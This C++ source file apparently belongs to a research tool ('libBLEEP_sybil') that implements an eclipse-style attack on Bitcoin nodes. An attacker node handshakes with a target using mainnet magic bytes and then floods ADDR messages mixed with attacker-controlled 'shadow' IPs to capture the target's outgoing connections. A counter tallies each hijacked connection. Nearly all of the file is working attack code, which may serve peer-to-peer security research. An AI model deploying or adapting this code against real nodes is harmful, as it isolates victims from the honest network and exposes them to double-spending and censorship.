//
// Created by ilios on 21. 2. 15..
//
#include <iostream>
#include "BitcoinNodePrimitives.h"
#include <random>

// bitcoin-specific data management
#include <net.h>
#include <netmessagemaker.h>
#include <util/strencodings.h>
#include <chainparams.h>

using namespace libBLEEP_sybil;
using namespace std;

void BitcoinNodePrimitives::OpAfterConnect(int conn_fd) {
    cout << "OpAfterConnect for node [" << GetIP() << "]" << "\n";
    switch (_type) {
        case NodeType::Attacker: {
            // send initializing version message
            const unsigned char MessageStartChars[4] = {0xf9, 0xbe, 0xb4, 0xd9}; // for mainnet f9beb4d9

            // their_addr
            CAddress their_addr;
            struct sockaddr_in new_addr;    /* my address information */
            new_addr.sin_family = AF_INET;         /* host byte order */
            new_addr.sin_port = htons(_targetPort);     /* short, network byte order */
            new_addr.sin_addr.s_addr = inet_addr(_targetIP.c_str());
            bzero(&(new_addr.sin_zero), 8);        /* zero the rest of the struct */

            if (!their_addr.SetSockAddr((const struct sockaddr *) &new_addr)) {
                LogPrintf("Warning: Unknown socket family\n");
            }

            // version message
            ServiceFlags nLocalNodeServices = ServiceFlags(NODE_NETWORK | NODE_WITNESS | NODE_NETWORK_LIMITED);
            uint64_t nonce = 0;
            int myNodeStartingHeight = 0;
            CAddress addrMe = CAddress(CService(), nLocalNodeServices);

            CSerializedNetMsg msg = CNetMsgMaker(INIT_PROTO_VERSION).Make(NetMsgType::VERSION, PROTOCOL_VERSION,
                                                                          (uint64_t) nLocalNodeServices, GetTime(),
                                                                          their_addr, addrMe, nonce, strSubVersion,
                                                                          myNodeStartingHeight, true);

            size_t nMessageSize = msg.data.size();
            //size_t nTotalSize = nMessageSize + CMessageHeader::HEADER_SIZE;
            LogPrint(BCLog::NET, "sending %s (%d bytes) \n", SanitizeString(msg.command.c_str()), nMessageSize);

            vector<unsigned char> serializedHeader;
            serializedHeader.reserve(CMessageHeader::HEADER_SIZE);
            uint256 hash = Hash(msg.data.data(), msg.data.data() + nMessageSize);
            CMessageHeader hdr(MessageStartChars, msg.command.c_str(), nMessageSize);
            memcpy(hdr.pchChecksum, hash.begin(), CMessageHeader::CHECKSUM_SIZE);

            CVectorWriter{SER_NETWORK, INIT_PROTO_VERSION, serializedHeader, 0, hdr};

            SendMsg(conn_fd, serializedHeader);
            if (nMessageSize) {
                SendMsg(conn_fd, msg.data);
            }

            break;
        }
        case NodeType::Benign:
        case NodeType::Shadow: {
            assert(-1);
            break;
        }
    }
}

void BitcoinNodePrimitives::OpAfterConnected(int data_fd) {
    // do nothing
}

void BitcoinNodePrimitives::OpAfterRecv(int data_fd, string recv_str) {
    // recv to RecvBuffer
    TCPControl &tcpControl = GetTCPControl(data_fd);
    tcpControl.AppendToRecvBuffer(recv_str);

    // get all received data stream
    string &recvbufstr = tcpControl.GetRecvBuffer();

    while (recvbufstr.size() > 0) {
        // first, dump a message header
        CNetMessage msg(Params().MessageStart(), SER_NETWORK,
                        INIT_PROTO_VERSION); // error when bitcoin is not initialized
        int headerReadSize = msg.readHeader(recvbufstr.c_str(), recvbufstr.size());
        if (headerReadSize < 0) {// error while reading header
            std::cout << "error while reading header" << "\n";
            assert(-1);
        }
        if (!msg.in_data) // header is not fully received
            return;

        // second, dump a message
        string msgstr = recvbufstr.substr(headerReadSize);
        int msgReadSize = msg.readData(msgstr.c_str(),
                                       msgstr.size());  // TODO : can be optimized to check size before dumping
        if (msgReadSize < 0) {// error??
            std::cout << "unrecognized error while reading data" << "\n";
            assert(-1);
        }
        if (msg.in_data && msg.hdr.nMessageSize > MAX_PROTOCOL_MESSAGE_LENGTH) {
            cout << "Oversized message" << "\n";
            exit(-1);
        }

        // third, parse a message
        if (!msg.complete()) {
            // data is not fully received
            return;
        } else {
            // data is fully received, so handle the message
            const unsigned char MessageStartChars[4] = {0xf9, 0xbe, 0xb4, 0xd9}; // for mainnet f9beb4d9

            if (memcmp(msg.hdr.pchMessageStart, MessageStartChars, CMessageHeader::MESSAGE_START_SIZE) != 0) {
                cout << "INVALID MESSAGESTART " << msg.hdr.GetCommand() << "\n";
                exit(-1);
            }

            // their_addr
            CAddress their_addr;
            struct sockaddr_in new_addr;    /* my address information */
            new_addr.sin_family = AF_INET;         /* host byte order */
            new_addr.sin_port = htons(_targetPort);     /* short, network byte order */
            new_addr.sin_addr.s_addr = inet_addr(_targetIP.c_str());
            bzero(&(new_addr.sin_zero), 8);        /* zero the rest of the struct */

            if (!their_addr.SetSockAddr((const struct sockaddr *) &new_addr)) {
                LogPrintf("Warning: Unknown socket family\n");
            }

            // Read header
            CMessageHeader &hdr = msg.hdr;
            if (!hdr.IsValid(MessageStartChars)) {
                LogPrint(BCLog::NET, "PROCESSMESSAGE: ERRORS IN HEADER %s\n", hdr.GetCommand());
                exit(-1);
            }
            string strCommand = hdr.GetCommand();
            CDataStream &vRecv = msg.vRecv;

            if (strCommand == NetMsgType::VERSION) {
                int64_t nTime;
                CAddress addrMe;
                CAddress addrFrom;
                uint64_t nNonce = 1;
                uint64_t nServiceInt;

                int nVersion;
                string cleanSubVer;
                int nStartingHeight = -1;
                bool fRelay = true;

                vRecv >> nVersion >> nServiceInt >> nTime >> addrMe;

                if (!vRecv.empty())
                    vRecv >> addrFrom >> nNonce;
                if (!vRecv.empty()) {
                    string strSubVer;
                    vRecv >> LIMITED_STRING(strSubVer, MAX_SUBVERSION_LENGTH);
                    cleanSubVer = SanitizeString(strSubVer);
                }
                if (!vRecv.empty()) {
                    vRecv >> nStartingHeight;
                }
                if (!vRecv.empty())
                    vRecv >> fRelay;

                if (_type == NodeType::Benign || _type == NodeType::Shadow) {
                    // VERSION message from inbound connection
                    // send version message (reply)
                    ServiceFlags nLocalNodeServices = ServiceFlags(NODE_NETWORK | NODE_WITNESS | NODE_NETWORK_LIMITED);
                    uint64_t nonce = 0;
                    int myNodeStartingHeight = nStartingHeight;

                    CSerializedNetMsg replymsg = CNetMsgMaker(INIT_PROTO_VERSION).Make(NetMsgType::VERSION,
                                                                                       PROTOCOL_VERSION,
                                                                                       (uint64_t) nLocalNodeServices,
                                                                                       nTime,
                                                                                       their_addr, addrFrom, nonce,
                                                                                       strSubVersion,
                                                                                       myNodeStartingHeight, true);

                    size_t nMessageSize = replymsg.data.size();
                    //size_t nTotalSize = nMessageSize + CMessageHeader::HEADER_SIZE;
                    LogPrint(BCLog::NET, "sending %s (%d bytes) \n", SanitizeString(replymsg.command.c_str()),
                             nMessageSize);

                    vector<unsigned char> serializedHeader;
                    serializedHeader.reserve(CMessageHeader::HEADER_SIZE);
                    uint256 hash = Hash(replymsg.data.data(), replymsg.data.data() + nMessageSize);
                    CMessageHeader replymsghdr(MessageStartChars, replymsg.command.c_str(), nMessageSize);
                    memcpy(replymsghdr.pchChecksum, hash.begin(), CMessageHeader::CHECKSUM_SIZE);

                    CVectorWriter{SER_NETWORK, INIT_PROTO_VERSION, serializedHeader, 0, replymsghdr};

                    SendMsg(data_fd, serializedHeader);
                    if (nMessageSize)
                        SendMsg(data_fd, replymsg.data);
                }

                {
                    // send verack message
                    CSerializedNetMsg verack_msg = CNetMsgMaker(INIT_PROTO_VERSION).Make(NetMsgType::VERACK);
                    size_t nMessageSize = verack_msg.data.size();
                    LogPrint(BCLog::NET, "sending %s (%d bytes) \n", SanitizeString(verack_msg.command.c_str()),
                             nMessageSize);

                    vector<unsigned char> verack_serializedHeader;
                    verack_serializedHeader.reserve(CMessageHeader::HEADER_SIZE);
                    uint256 hash = Hash(verack_msg.data.data(), verack_msg.data.data() + nMessageSize);
                    CMessageHeader verack_hdr(MessageStartChars, verack_msg.command.c_str(), nMessageSize);
                    memcpy(verack_hdr.pchChecksum, hash.begin(), CMessageHeader::CHECKSUM_SIZE);

                    CVectorWriter{SER_NETWORK, INIT_PROTO_VERSION, verack_serializedHeader, 0, verack_hdr};

                    SendMsg(data_fd, verack_serializedHeader);
                    if (nMessageSize)
                        SendMsg(data_fd, verack_msg.data);
                }
            } else if (strCommand == NetMsgType::PING) {
                cout << "received PING" << "\n";
                uint64_t nonce = 0;
                vRecv >> nonce;

                CSerializedNetMsg replymsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::PONG, nonce);

                size_t nMessageSize = replymsg.data.size();
                //size_t nTotalSize = nMessageSize + CMessageHeader::HEADER_SIZE;
                // LogPrint(BCLog::NET, "sending %s (%d bytes) \n", SanitizeString(msg.command.c_str()), nMessageSize);

                vector<unsigned char> serializedHeader;
                serializedHeader.reserve(CMessageHeader::HEADER_SIZE);
                uint256 hash = Hash(replymsg.data.data(), replymsg.data.data() + nMessageSize);
                CMessageHeader replymsghdr(MessageStartChars, replymsg.command.c_str(), nMessageSize);
                memcpy(replymsghdr.pchChecksum, hash.begin(), CMessageHeader::CHECKSUM_SIZE);

                CVectorWriter{SER_NETWORK, INIT_PROTO_VERSION, serializedHeader, 0, replymsghdr};

                SendMsg(data_fd, serializedHeader);
                if (nMessageSize)
                    SendMsg(data_fd, replymsg.data);

                if (_type == NodeType::Shadow && !_informed) {

                    // print attack success message
                    cout
                            << "Interception of target node's outgoing connection is confirmed"
                            << ", Shadow NodeIP:" << GetIP() << "\n";
                    // update attack statistics
                    _attackStat->IncrementHijackedOutgoingConnNum();
                    _informed = true;
                }
            }

            // Maybe, recvBuffer can be updated more efficiently. (minimizing a duplication)
            std::string remain = recvbufstr.substr(headerReadSize + msgReadSize);
            tcpControl.SetRecvBuffer(remain);
        }

        // repeating the process until there is remaining data stream in RecvBuffer
        recvbufstr = tcpControl.GetRecvBuffer();
    }
}

void BitcoinNodePrimitives::OpAfterDisconnect() {
    // do nothing
}

void BitcoinNodePrimitives::OpAddrInjectionTimeout(std::chrono::system_clock::duration preparePhaseDuration,
                                                   int periodLength, double ipPerSec, double shadowRate) {
    auto now = chrono::system_clock::now();
    auto attack_start_time = _setupTime + preparePhaseDuration;

    vector<string> vReachableIP;
    for (auto &[ip, uptime] : _ipdb->GetVReachableIP())
        vReachableIP.push_back(ip);
    vector<string> &vUnreachIP = _ipdb->GetVUnreachableIP();
    vector<string> &vShadowIP = _ipdb->GetVShadowIP();

    vector<string> vAddr;

    if (now < attack_start_time) {
        // if it's prepare phase
        int totalIPCount = 1000;
        int legiIPcount = totalIPCount * 0.3;
        int unreLegiIPcount = totalIPCount * 0.7;

        sample(vReachableIP.begin(), vReachableIP.end(), back_inserter(vAddr), legiIPcount,
               mt19937{random_device{}()});
        sample(vUnreachIP.begin(), vUnreachIP.end(), back_inserter(vAddr), unreLegiIPcount,
               mt19937{random_device{}()});
    } else {
        // if it's attack phase
        int totalIPCount = std::min(1000, (int) (periodLength * ipPerSec));
        int legiIPcount = totalIPCount * (1 - shadowRate) * 0.3;
        int unreLegiIPcount = totalIPCount * (1 - shadowRate) * 0.7;
        int shadowIPcount = totalIPCount * shadowRate;


        std::sample(vReachableIP.begin(), vReachableIP.end(), std::back_inserter(vAddr), legiIPcount,
                    std::mt19937{std::random_device{}()});
        std::sample(vUnreachIP.begin(), vUnreachIP.end(), std::back_inserter(vAddr), unreLegiIPcount,
                    std::mt19937{std::random_device{}()});
        std::sample(vShadowIP.begin(), vShadowIP.end(), std::back_inserter(vAddr), shadowIPcount,
                    std::mt19937{std::random_device{}()});
        std::cout << "debug print start (attack phase)" << "\n";
        std::cout << "legiIPcount:" << legiIPcount << ", unreachable legiIPCount:" << unreLegiIPcount
                  << ", shadowIPcount:" << shadowIPcount << "\n";
    }

    // assume a single data socket
    assert(_mTCPControl.size() == 1);
    int data_fd = _mTCPControl.begin()->first;

    // Create a ADDR message for `vIP`,
    // then push it to message queue
    const unsigned char MessageStartChars[4] = {0xf9, 0xbe, 0xb4, 0xd9}; // for mainnet f9beb4d9

    ServiceFlags nLocalNodeServices = ServiceFlags(NODE_NETWORK | NODE_WITNESS | NODE_NETWORK_LIMITED);
    std::vector<CAddress> vCAddr;
    vCAddr.reserve(vAddr.size());
    for (std::string ip : vAddr) {
        struct in_addr in_addr_ip;
        in_addr_ip.s_addr = inet_addr(ip.c_str());
        CAddress addr = CAddress(CService(CNetAddr(in_addr_ip), 8333), nLocalNodeServices);

        vCAddr.push_back(addr);
    }
    CSerializedNetMsg msg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::ADDR, vCAddr);

    size_t nMessageSize = msg.data.size();
//    size_t nTotalSize = nMessageSize + CMessageHeader::HEADER_SIZE;
    LogPrint(BCLog::NET, "sending %s (%d bytes) \n", SanitizeString(msg.command.c_str()), nMessageSize);

    std::vector<unsigned char> serializedHeader;
    serializedHeader.reserve(CMessageHeader::HEADER_SIZE);
    uint256 hash = Hash(msg.data.data(), msg.data.data() + nMessageSize);
    CMessageHeader hdr(MessageStartChars, msg.command.c_str(), nMessageSize);
    memcpy(hdr.pchChecksum, hash.begin(), CMessageHeader::CHECKSUM_SIZE);

    CVectorWriter{SER_NETWORK, PROTOCOL_VERSION, serializedHeader, 0, hdr};

    SendMsg(data_fd, serializedHeader);
    if (nMessageSize) {
        SendMsg(data_fd, msg.data);
    }
}